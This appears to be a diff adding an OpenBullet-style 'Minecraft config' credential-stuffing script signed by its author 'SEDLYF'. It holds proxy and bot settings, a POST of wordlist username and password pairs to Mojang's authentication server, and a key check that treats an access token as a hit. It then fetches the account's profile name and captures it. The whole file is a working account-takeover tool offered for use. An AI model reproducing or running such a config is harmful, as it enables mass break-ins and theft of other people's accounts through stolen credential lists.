@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "MINECRAFT CONFIG BY SEDLYF",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-24T16:42:49.4925452+05:30",
+  "AdditionalInfo": "",
+  "Author": "SEDLYF",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"<USER>\",\"password\": \"<PASS>\",\"requestUser\": \"true\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: authserver.mojang.com" 
+  HEADER "Proxy-Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "token" 
+
+REQUEST GET "https://api.minecraftservices.com/minecraft/profile" 
+  
+  HEADER "Host: api.minecraftservices.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Origin: https://www.minecraft.net" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.minecraft.net/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "name" -> VAR "Username" 
+
+FUNCTION Constant "SEDLYF" -> CAP "Config by" 
+
